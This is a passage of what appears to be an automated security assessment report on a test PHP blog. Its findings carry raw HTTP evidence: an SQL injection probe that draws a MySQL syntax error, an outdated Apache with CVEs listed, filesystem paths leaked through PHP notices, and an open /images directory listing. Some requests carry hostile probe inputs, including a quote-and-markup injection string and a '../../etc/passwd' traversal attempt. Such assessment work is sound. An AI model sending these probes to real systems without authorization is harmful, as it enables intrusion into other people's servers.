<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <p>No posts found.</p></div>
</body>
</html>
```

- Evidence `ev-mqz1rwib-2b` — `artifacts/_/ev-mqz1rwib-2b/`

Request:

```http
GET /?category=UMBRA7317%27%22%3E%3Csvg%3E HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-encoding: gzip
content-length: 608
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 10:00:48 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"><svg>' ORDER BY created_at DESC' at line 1
```

- Evidence `ev-mqz1ry21-2c` — `artifacts/_/ev-mqz1ry21-2c/`

Request:

```http
GET /?category=UMBRA7317%27%22%3E%3Csvg%3E HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-encoding: gzip
content-length: 608
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 10:00:50 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"><svg>' ORDER BY created_at DESC' at line 1
```

<a id="finding-5"></a>

### 5. [MEDIUM] [vulnerable-component] Outdated Apache httpd 2.4.54 — known CVEs fixed in 2.4.55/2.4.56 (CVE-2006-20001, CVE-2022-37436, CVE-2023-25690)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32868/

VERSION-BASED finding (matched by banner, not actively exploited). The server advertises `Server: Apache/2.4.54 (Debian)` on every response, including the 404 footer `Apache/2.4.54 (Debian) Server at target.local Port 32868`. Apache httpd 2.4.54 (released 2022-06) predates several security fixes: CVE-2006-20001 — out-of-bounds read/write in mod_dav when processing a crafted If: header on PROPFIND (memory corruption / DoS), fixed in 2.4.55; CVE-2022-37436 — mod_proxy response-header truncation allowing a malicious backend to fold headers into the body, fixed in 2.4.55; CVE-2023-25690 — HTTP request smuggling via mod_proxy with certain RewriteRule/ProxyPassMatch configurations (CVSS 9.8, CRITICAL), fixed in 2.4.56; CVE-2023-27522 — mod_proxy_uwsgi HTTP response splitting, fixed in 2.4.56. Severity is set to MEDIUM rather than the critical CVE's 9.8 because the high-impact issues are module/configuration-dependent — CVE-2023-25690 needs mod_proxy + specific rewrite rules and CVE-2006-20001 needs mod_dav, and this target presents as a direct server-rendered PHP blog with no evidence of reverse-proxy or WebDAV. The operator should confirm which modules are loaded; if mod_proxy is used as a reverse proxy with RewriteRule, escalate to HIGH/CRITICAL for CVE-2023-25690. Recommended remediation: upgrade to a current 2.4.x (>= 2.4.59) and suppress the version banner via ServerTokens Prod / ServerSignature Off.

**Reproduction**

```
1. GET http://target.local:32868/ → response header `Server: Apache/2.4.54 (Debian)`. 2. Request a non-existent path (negative control, 404) — its body footer also discloses `Apache/2.4.54 (Debian) Server at target.local Port 32868`, confirming the version independent of X-Powered-By. 3. Map 2.4.54 against the httpd changelog: CVE-2006-20001 & CVE-2022-37436 fixed in 2.4.55, CVE-2023-25690 & CVE-2023-27522 fixed in 2.4.56 — all post-date 2.4.54. Positives: two stable 200 banner pages reproduce the Server header.
```

**Evidence**

- Evidence `ev-mqz1n0g8-27` — `artifacts/_/ev-mqz1n0g8-27/`

Request:

```http
GET /verdict-nonexistent-path-404 HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 09:57:00 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.54 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at target.local Port 32868</address>
</body></html>
```

- Evidence `ev-mqz1mz5h-25` — `artifacts/_/ev-mqz1mz5h-25/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5630
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:56:58 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
</body>
</html>
```

- Evidence `ev-mqz1mzmx-26` — `artifacts/_/ev-mqz1mzmx-26/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5630
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:56:59 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
</body>
</html>
```

<a id="finding-6"></a>

### 6. [LOW] [info-disclosure] PHP error notices expose server filesystem path in every response

- Screen: `s-0005`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32868/

Every response from `/index.php` contains PHP `Notice: Undefined variable: category in /var/www/html/index.php on line 28` — leaking the absolute server filesystem path unconditionally. The variable `$category` is used before initialization; with `display_errors = On` in production, the notice is emitted on every page load regardless of user input. This aids attackers in mapping the server layout and correlates with the SQL injection finding on the same endpoint.

**Reproduction**

```
1. GET /styles.css → 200, 453 bytes, clean CSS with no path disclosure (negative control).\n2. GET /index.php?category=ValidCategory → 200, 1515 bytes, HTML contains: "Notice: Undefined variable: category in /var/www/html/index.php on line 28" repeated 6 times.\n3. Repeat step 2 → same 1515-byte response with same notices (stable).
```

**Evidence**

- Evidence `ev-mqz0xvwg-16` — `artifacts/s-0005/ev-mqz0xvwg-16/`

Request:

```http
GET /styles.css HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
connection: Keep-Alive
content-length: 453
content-type: text/css
date: Mon, 29 Jun 2026 09:37:27 GMT
etag: "1c5-6553e04418500-gzip"
keep-alive: timeout=5, max=99
last-modified: Sat, 27 Jun 2026 15:38:28 GMT
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding

body {
    font-family: Arial, sans-serif;
    background-color: #f4f4f9;
    margin: 0;
    padding: 20px;
}
.container {
    width: 80%;
    margin: auto;
    background: white;
    padding: 20px;
    border-radius: 8px;
}
.post {
    border-bottom: 1px solid #ccc;
    padding-bottom: 20px;
    margin-bottom: 20px;
}
.post h2 a {
    color: #333;
    text-decoration: none;
}
.post img {
    width: 100%;
    height: auto;
    border-radius: 5px;
}
```

- Evidence `ev-mqz0x2nh-11` — `artifacts/s-0005/ev-mqz0x2nh-11/`

Request:

```http
GET /index.php?category=ValidCategory HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1515
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:36:50 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <p>No posts found.</p></div>
</body>
</html>
```

- Evidence `ev-mqz0zny7-18` — `artifacts/s-0005/ev-mqz0zny7-18/`

Request:

```http
GET /index.php?category=ValidCategory HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1515
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:38:50 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <p>No posts found.</p></div>
</body>
</html>
```

<a id="finding-7"></a>

### 7. [LOW] [info-disclosure] Apache directory listing enabled on /images

- Screen: `s-0006`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32868/

The /images directory has Apache mod_autoindex enabled and returns a full "Index of /images" directory listing to unauthenticated requests. This exposes filenames (morning-dew.jpg, sunset.jpg), file sizes, and modification timestamps. The server also reveals its version string: Apache/2.4.54 (Debian).

**Reproduction**

```
1. GET http://target.local:32868/images/ (no auth required)
2. Response is HTTP 200 with HTML body containing "Index of /images", listing all files with sizes and timestamps.
3. Compare with a non-existent path (/images/nonexistent-dir/) which returns HTTP 404 — confirming the listing is intentionally served for the real directory.
```

**Evidence**

- Evidence `ev-mqz11c1v-1f` — `artifacts/s-0006/ev-mqz11c1v-1f/`

Request:

```http
GET /images/nonexistent-dir/ HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 09:40:08 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.54 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at target.local Port 32868</address>
</body></html>
```

- Evidence `ev-mqz10mo3-19` — `artifacts/s-0006/ev-mqz10mo3-19/`

Request:

```http
GET /images/ HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1156
content-type: text/html;charset=UTF-8
date: Mon, 29 Jun 2026 09:39:35 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /images</title>
 </head>
 <body>
<h1>Index of /images</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="morning-dew.jpg">morning-dew.jpg</a></td><td align="right">2026-06-27 15:38  </td><td align="right">267K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="sunset.jpg">sunset.jpg</a></td><td align="right">2026-06-27 15:38  </td><td align="right">221K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.54 (Debian) Server at target.local Port 32868</address>
</body></html>
```

- Evidence `ev-mqz11a9t-1d` — `artifacts/s-0006/ev-mqz11a9t-1d/`

Request:

```http
GET /images/?C=../../etc/passwd HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1156
content-type: text/html;charset=UTF-8
date: Mon, 29 Jun 2026 09:40:06 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /images</title>
 </head>
 <body>
<h1>Index of /images</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="morning-dew.jpg">morning-dew.jpg</a></td><td align="right">2026-06-27 15:38  </td><td align="right">267K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="sunset.jpg">sunset.jpg</a></td><td align="right">2026-06-27 15:38  </td><td align="right">221K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.54 (Debian) Server at target.local Port 32868</address>
</body></html>
```

<a id="finding-8"></a>

### 8. [INFO] [burp] Path-relative style sheet import (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. The page does not contain a doctype directive, and  [+1 more URL(s): http://target.local:32868/index.php] @ http://target.local:32868/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqz1r34w-28` — `artifacts/_/ev-mqz1r34w-28/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32868

GET / HTTP/1.1
Host: target.local:32868
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
Date: Mon, 29 Jun 2026 09:58:00 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 5630
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
